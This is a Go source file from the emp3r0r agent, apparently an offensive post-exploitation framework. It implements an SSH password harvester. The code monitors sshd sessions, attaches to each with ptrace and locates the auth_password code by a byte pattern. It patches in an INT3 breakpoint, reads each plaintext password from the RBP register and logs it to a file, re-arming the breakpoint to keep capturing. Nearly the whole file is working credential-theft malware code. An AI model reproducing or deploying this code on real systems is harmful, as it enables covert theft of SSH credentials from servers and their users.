//go:build linux && amd64
// +build linux,amd64

package agent

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/sys/unix"
)

var (
	traced_pids     = make(map[int]bool)
	traced_pids_mut = &sync.RWMutex{}
)

func sshd_monitor(password_file string) (err error) {
	alive, sshd_procs := util.IsProcAlive("sshd")
	if !alive {
		err = fmt.Errorf("SSHD process not found")
		return
	}

	util.LogFilePrintf(password_file, "sshd_monitor started (%d)", unix.Getpid())
	monitor := func(sshd_pid int) {
		util.LogFilePrintf(password_file, "Started monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_pid)
		for {
			util.TakeABlink()
			children_file := fmt.Sprintf("/proc/%d/task/%d/children", sshd_pid, sshd_pid)
			children_data, err := os.ReadFile(children_file)
			if err != nil {
				return
			}
			children_pids := strings.Fields(string(children_data))
			for _, child := range children_pids {
				child_pid, err := strconv.Atoi(child)
				if err == nil {
					traced_pids_mut.RLock()
					if !traced_pids[child_pid] {
						go sshd_harvester(child_pid, password_file)
					}
					traced_pids_mut.RUnlock()
				}
			}
		}
	}
	for _, sshd_proc := range sshd_procs {
		util.LogFilePrintf(password_file, "Starting monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_proc.Pid)
		go monitor(sshd_proc.Pid)
	}

	for {
		util.TakeASnap()
	}
}

func sshd_harvester(pid int, password_file string) {
	// remember pid
	traced_pids_mut.Lock()
	traced_pids[pid] = true
	traced_pids_mut.Unlock()

	code_pattern_bigendian := []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
	util.LogFilePrintf(password_file, "\n[+] Starting Harvester for SSHD session %d", pid)
	map_file := fmt.Sprintf("/proc/%d/maps", pid)
	map_data, err := os.ReadFile(map_file)
	if err != nil {
		util.LogFilePrintf(password_file, "Failed to read memory map of %d: %v", pid, err)
		return
	}
	// parse memory map
	lines := strings.Split(string(map_data), "\n")
	var (
		ptr  uint64 // start of sshd process, start of code pattern
		pend uint64 // end of sshd process
	)
	for _, line := range lines {
		if strings.Contains(line, "/sshd") &&
			strings.Contains(line, "r-x") {
			f1 := strings.Fields(line)[0]
			if len(f1) < 2 {
				util.LogFilePrintf(password_file, "Error parsing line: %s", line)
				continue
			}
			start := strings.Split(f1, "-")[0]
			end := strings.Split(f1, "-")[1]
			ptr, err = strconv.ParseUint(start, 16, 64)
			if err != nil {
				util.LogFilePrintf(password_file, "Parsing pstart: %v", err)
				return
			}
			pend, err = strconv.ParseUint(end, 16, 64)
			if err != nil {
				util.LogFilePrintf(password_file, "Parsing pend: %v", err)
				return
			}
		}
	}
	util.LogFilePrintf(password_file, "Harvester PID is %d", unix.Getpid())
	util.LogFilePrintf(password_file, "SSHD process found in 0x%x - 0x%x", ptr, pend)
	pstart := ptr

	// #13 https://github.com/jm33-m0/emp3r0r/issues/13
	// fixes "no such process" error
	// this makes sure we don't lose our tracee
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err = unix.PtraceAttach(pid)
	if err != nil {
		util.LogFilePrintf(password_file, "Failed to attach to %d: %v", pid, err)
		return
	}
	defer unix.PtraceDetach(pid)
	word := make([]byte, 8)
	util.LogFilePrintf(password_file, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)

	// search for auth_password
	log.Println("Searching for auth_password")
	for ptr < pend {
		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
		if err != nil {
			util.LogFilePrintf(password_file, "PTRACE_PEEKTEXT Searching memory of %d: %v",
				pid, err)
			time.Sleep(time.Second)
		}
		if bytes.Equal(word, code_pattern_bigendian) {
			util.LogFilePrintf(password_file, "Got a hit (0x%x) at 0x%x", word, ptr)
			// now pstart is the start of our code pattern
			break
		}
		ptr++
	}
	if ptr == pend {
		util.LogFilePrintf(password_file, "Code pattern 0x%x not found in memory 0x%x to 0x%x",
			code_pattern_bigendian, pstart, pend)
		return
	}

	// points to the start of our code pattern
	pcode_pattern := uintptr(ptr)
	// dump code at code pattern
	dump_code(pid, pcode_pattern)

	// before breakpoint, what does the code look like
	dump_code(pid, 0)

	// write breakpoint
	code_with_trap := make([]byte, 8)
	copy(code_with_trap, code_pattern_bigendian)
	code_with_trap[len(code_with_trap)-1] = 0xCC
	util.LogFilePrintf(password_file, "Patching code 0x%x to 0x%x", code_pattern_bigendian, code_with_trap)
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		util.LogFilePrintf(password_file, "Patching code: %v", err)
		return
	}
	util.LogFilePrintf(password_file, "INT3 written, breakpoint set")
	dump_code(pid, pcode_pattern)
	log.Println("Resuming process to let it hit breakpoint")
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		util.LogFilePrintf(password_file, "Resuming process: %v", err)
		return
	}
	wstatus := new(unix.WaitStatus)
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogFilePrintf(password_file, "Wait %d to hit breakpoint: %v", pid, err)
		return
	}

handler:
	success := false
	util.LogFilePrintf(password_file, "SSHD %d has hit breakpoint", pid)
	// where are we at
	dump_code(pid, 0)

	// read registers on break
	regs := new(unix.PtraceRegs)
	err = unix.PtraceGetRegs(pid, regs)
	if err != nil {
		util.LogFilePrintf(password_file, "Get regs: %v", err)
		return
	}
	password_reg := regs.Rbp
	pam_ret := regs.Rax

	// read password from RBP
	buf := make([]byte, 1)
	var password_bytes []byte
	log.Println("Extracting password from RBP")
	for {
		_, err := unix.PtracePeekText(pid, uintptr(password_reg), buf)
		if err != nil {
			util.LogFilePrintf(password_file, "Reading password from RBP (0x%x): %v", password_reg, err)
			return
		}
		// until NULL is reached
		if buf[0] == 0 {
			break
		}
		password_bytes = append(password_bytes, buf...)
		password_reg++ // read next byte
	}
	password := string(password_bytes)
	if pam_ret == 0 {
		util.LogFilePrintf(password_file, "RAX=0x%x, password '%s' is invalid", pam_ret, password)
	} else {
		success = true
		util.LogFilePrintf(password_file, "\n\nWe have password '%s'\n\n", password)
	}
	// remove breakpoint
	log.Println("Removing breakpoint")
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern_bigendian)
	if err != nil {
		util.LogFilePrintf(password_file, "Restoring code to remove breakpoint: %v", err)
		return
	}
	// one byte back, go back before 0xCC, at the start of code pattern
	regs.Rip--
	err = unix.PtraceSetRegs(pid, regs)
	if err != nil {
		util.LogFilePrintf(password_file, "Set regs back: %v", err)
		return
	}
	// single step to execute original code
	err = unix.PtraceSingleStep(pid)
	if err != nil {
		util.LogFilePrintf(password_file, "Single step: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogFilePrintf(password_file, "Wait %d to single step: %v", pid, err)
		return
	}
	log.Println("Single step done")

	// check if breakpoint is removed
	dump_code(pid, pcode_pattern)
	util.LogFilePrintf(password_file, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)

	// add breakpoint back
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		util.LogFilePrintf(password_file, "Patching code: %v", err)
		return
	}
	util.LogFilePrintf(password_file, "Added breakpoint back")

	// continue sshd session process
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		util.LogFilePrintf(password_file, "Continue SSHD session: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogFilePrintf(password_file, "Wait %d to continue: %v", pid, err)
		return
	}
	switch {
	case wstatus.Stopped():
		if !success {
			goto handler
		}
	case wstatus.Exited():
		util.LogFilePrintf(password_file, "SSHD %d exited...", pid)
	case wstatus.CoreDump():
		util.LogFilePrintf(password_file, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		util.LogFilePrintf(password_file, "SSHD %d core continues...", pid)
	default:
		util.LogFilePrintf(password_file, "Uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
	}
}

func dump_code(pid int, addr uintptr) {
	if addr == 0 {
		regs := new(unix.PtraceRegs)
		err := unix.PtraceGetRegs(pid, regs)
		if err != nil {
			log.Printf("dump code for %d failed: %v", pid, err)
			return
		}
		addr = uintptr(regs.Rip)
	}
	code_bytes := make([]byte, 128)
	_, err := unix.PtracePeekText(pid, addr, code_bytes)
	if err != nil {
		log.Printf("dump code for %d failed: PEEKTEXT: %v", pid, err)
		return
	}
	log.Printf("Dumped code at 0x%x: 0x%x", addr, code_bytes)
}

func get_tracer_pid(pid int) (tracer_pid int) {
	// check tracer pid
	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		log.Printf("get_tracer: %v", err)
		return
	}
	lines := strings.Split(string(proc_status), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			tracer := strings.Fields(line)[1]
			tracer_pid, err = strconv.Atoi(tracer)
			if err != nil {
				log.Printf("Invalid tracer PID: %v", err)
				return
			}
			break
		}
	}

	return
}
